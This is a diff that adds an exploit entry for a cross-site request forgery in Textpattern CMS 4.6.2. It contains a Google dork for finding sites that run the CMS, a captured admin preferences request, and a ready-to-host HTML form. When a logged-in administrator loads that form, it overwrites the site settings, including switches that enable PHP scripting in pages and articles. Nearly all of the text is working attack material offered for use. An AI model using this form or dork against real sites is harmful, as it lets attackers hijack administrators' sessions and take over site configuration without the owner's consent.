@@ -1,0 +1,137 @@
+# Exploit Title: Textpattern CMS 4.6.2 - Cross-site Request Forgery
+# Exploit Author: Alperen Ergel
+# Contact: @alpren_ae
+# Software Homepage: https://textpattern.com/
+# Version : 4.6.2
+# Tested on: windows 10 / xammp
+# Category: WebApp
+# Google Dork: intext:"Published with Textpattern CMS"
+# Date: 2020-10-29
+######## Description ########
+#
+# 1-) Loggin administrator page
+# 
+# 2-) Go admin > prefs > site
+#
+# 3-) All inputs vulnerable to CSRF
+#
+#
+######## Proof of Concept ########
+
+========>>> REQUEST <<<=========
+
+POST /textpattern/textpattern/index.php?event=prefs HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/textpattern/textpattern/index.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1806
+Connection: close
+Cookie: txp_login=localhost%2Ca170e235c4f2f59bb1300272c470807d; txp_login_public=a834cbdc8blocalhost; __atuvc=1%7C40
+Upgrade-Insecure-Requests: 1
+
+Submit=Save&sitename=victim+site&siteurl=victimurl.com&site_slogan=victimslogan&production_status=testing&timezone_key=Europe%2FBerlin&auto_dst=0&
+is_dst=0&dateformat=since&archive_dateformat=%25b+%25Oe%2C+%25I%3A%25M+%25p&permlink_mode=section_id_title&doctype=html5&logging=none&expire_logs_after=7&
+use_comments=1&img_dir=images&skin_dir=themes&file_base_path=%2Fvar%2Fwww%2Fvhosts%2Flocalhost%2Fhttpdocs%2Ftextpattern%2Ffiles&
+file_max_upload_size=2000000&tempdir=%2Fvar%2Fwww%2Fvhosts%2Flocalhost%2Fhttpdocs%2Ftextpattern%2Ftextpattern%2Ftmp&plugin_cache_dir=&
+smtp_from=&publisher_email=&override_emailcharset=0&enable_xmlrpc_server=0&default_event=article&theme_name=hive&module_pophelp=1&default_publish_status=4&
+title_no_widow=0&articles_use_excerpts=1&allow_form_override=1&attach_titles_to_permalinks=1&permlink_format=1&send_lastmod=1&publish_expired_articles=0&use_textile=1&enable_short_tags=1&
+use_plugins=1&admin_side_plugins=1&allow_page_php_scripting=1&allow_article_php_scripting=1&max_url_len=1000&syndicate_body_or_excerpt=1&rss_how_many=5&show_comment_count_in_feed=1&
+include_email_atom=0&use_mail_on_feeds_id=0&comments_on_default=0&comments_default_invite=Comment&comments_moderate=1&comments_disabled_after=42&comments_auto_append=0&
+comments_mode=0&comments_dateformat=%25b+%25Oe%2C+%25I%3A%25M+%25p&comments_sendmail=0&comments_are_ol=1&comment_means_site_updated=1&
+comments_require_name=1&comments_require_email=1&never_display_email=1&comment_nofollow=1&comments_disallow_images=0&comments_use_fat_textile=0&spam_blacklists=&
+custom_1_set=custom1&custom_2_set=custom2&custom_3_set=&custom_4_set=&custom_5_set=&custom_6_set=&custom_7_set=&custom_8_set=&custom_9_set=&custom_10_set=&
+step=prefs_save&event=prefs&_txp_token=0342db47efb6882b488f6d367067d720
+
+
+### EXPLOIT ####
+
+<html>
+  <!-- CSRF PoC -->
+  <body>
+    <form action="https://localhost/textpattern/textpattern/index.php" method="POST">
+      <input type="hidden" name="Submit" value="Save" />
+      <input type="hidden" name="sitename" value="CHANGEHERE" />
+      <input type="hidden" name="siteurl" value="CHANGEHERE" />
+      <input type="hidden" name="site&#95;slogan" value="CHANGEHERE" />
+      <input type="hidden" name="production&#95;status" value="testing" />
+      <input type="hidden" name="timezone&#95;key" value="Europe&#47;Berlin" />
+      <input type="hidden" name="auto&#95;dst" value="0" />
+      <input type="hidden" name="is&#95;dst" value="0" />
+      <input type="hidden" name="dateformat" value="since" />
+      <input type="hidden" name="archive&#95;dateformat" value="&#37;b&#32;&#37;Oe&#44;&#32;&#37;I&#58;&#37;M&#32;&#37;p" />
+      <input type="hidden" name="permlink&#95;mode" value="section&#95;id&#95;title" />
+      <input type="hidden" name="doctype" value="html5" />
+      <input type="hidden" name="logging" value="none" />
+      <input type="hidden" name="expire&#95;logs&#95;after" value="7" />
+      <input type="hidden" name="use&#95;comments" value="1" />
+      <input type="hidden" name="img&#95;dir" value="images" />
+      <input type="hidden" name="skin&#95;dir" value="themes" />
+      <input type="hidden" name="file&#95;base&#95;path" value="&#47;var&#47;www&#47;vhosts&#47;&#46;demo&#46;localhost&#46;&#47;httpdocs&#47;textpattern&#47;files" />
+      <input type="hidden" name="file&#95;max&#95;upload&#95;size" value="2000000" />
+      <input type="hidden" name="tempdir" value="&#47;var&#47;www&#47;vhosts&#47;&#46;demo&#46;localhost&#46;&#47;httpdocs&#47;textpattern&#47;textpattern&#47;tmp" />
+      <input type="hidden" name="plugin&#95;cache&#95;dir" value="" />
+      <input type="hidden" name="smtp&#95;from" value="" />
+      <input type="hidden" name="publisher&#95;email" value="" />
+      <input type="hidden" name="override&#95;emailcharset" value="0" />
+      <input type="hidden" name="enable&#95;xmlrpc&#95;server" value="0" />
+      <input type="hidden" name="default&#95;event" value="article" />
+      <input type="hidden" name="theme&#95;name" value="hive" />
+      <input type="hidden" name="module&#95;pophelp" value="1" />
+      <input type="hidden" name="default&#95;publish&#95;status" value="4" />
+      <input type="hidden" name="title&#95;no&#95;widow" value="0" />
+      <input type="hidden" name="articles&#95;use&#95;excerpts" value="1" />
+      <input type="hidden" name="allow&#95;form&#95;override" value="1" />
+      <input type="hidden" name="attach&#95;titles&#95;to&#95;permalinks" value="1" />
+      <input type="hidden" name="permlink&#95;format" value="1" />
+      <input type="hidden" name="send&#95;lastmod" value="1" />
+      <input type="hidden" name="publish&#95;expired&#95;articles" value="0" />
+      <input type="hidden" name="use&#95;textile" value="1" />
+      <input type="hidden" name="enable&#95;short&#95;tags" value="1" />
+      <input type="hidden" name="use&#95;plugins" value="1" />
+      <input type="hidden" name="admin&#95;side&#95;plugins" value="1" />
+      <input type="hidden" name="allow&#95;page&#95;php&#95;scripting" value="1" />
+      <input type="hidden" name="allow&#95;article&#95;php&#95;scripting" value="1" />
+      <input type="hidden" name="max&#95;url&#95;len" value="1000" />
+      <input type="hidden" name="syndicate&#95;body&#95;or&#95;excerpt" value="1" />
+      <input type="hidden" name="rss&#95;how&#95;many" value="5" />
+      <input type="hidden" name="show&#95;comment&#95;count&#95;in&#95;feed" value="1" />
+      <input type="hidden" name="include&#95;email&#95;atom" value="0" />
+      <input type="hidden" name="use&#95;mail&#95;on&#95;feeds&#95;id" value="0" />
+      <input type="hidden" name="comments&#95;on&#95;default" value="0" />
+      <input type="hidden" name="comments&#95;default&#95;invite" value="Comment" />
+      <input type="hidden" name="comments&#95;moderate" value="1" />
+      <input type="hidden" name="comments&#95;disabled&#95;after" value="42" />
+      <input type="hidden" name="comments&#95;auto&#95;append" value="0" />
+      <input type="hidden" name="comments&#95;mode" value="0" />
+      <input type="hidden" name="comments&#95;dateformat" value="&#37;b&#32;&#37;Oe&#44;&#32;&#37;I&#58;&#37;M&#32;&#37;p" />
+      <input type="hidden" name="comments&#95;sendmail" value="0" />
+      <input type="hidden" name="comments&#95;are&#95;ol" value="1" />
+      <input type="hidden" name="comment&#95;means&#95;site&#95;updated" value="1" />
+      <input type="hidden" name="comments&#95;require&#95;name" value="1" />
+      <input type="hidden" name="comments&#95;require&#95;email" value="1" />
+      <input type="hidden" name="never&#95;display&#95;email" value="1" />
+      <input type="hidden" name="comment&#95;nofollow" value="1" />
+      <input type="hidden" name="comments&#95;disallow&#95;images" value="0" />
+      <input type="hidden" name="comments&#95;use&#95;fat&#95;textile" value="0" />
+      <input type="hidden" name="spam&#95;blacklists" value="" />
+      <input type="hidden" name="custom&#95;1&#95;set" value="custom1" />
+      <input type="hidden" name="custom&#95;2&#95;set" value="custom2" />
+      <input type="hidden" name="custom&#95;3&#95;set" value="" />
+      <input type="hidden" name="custom&#95;4&#95;set" value="" />
+      <input type="hidden" name="custom&#95;5&#95;set" value="" />
+      <input type="hidden" name="custom&#95;6&#95;set" value="" />
+      <input type="hidden" name="custom&#95;7&#95;set" value="" />
+      <input type="hidden" name="custom&#95;8&#95;set" value="" />
+      <input type="hidden" name="custom&#95;9&#95;set" value="" />
+      <input type="hidden" name="custom&#95;10&#95;set" value="" />
+      <input type="hidden" name="step" value="prefs&#95;save" />
+      <input type="hidden" name="event" value="prefs" />
+      <input type="hidden" name="&#95;txp&#95;token" value="0342db47efb6882b488f6d367067d720" />
+      <input type="submit" value="Do Action" />
+    </form>
+  </body>
+</html>
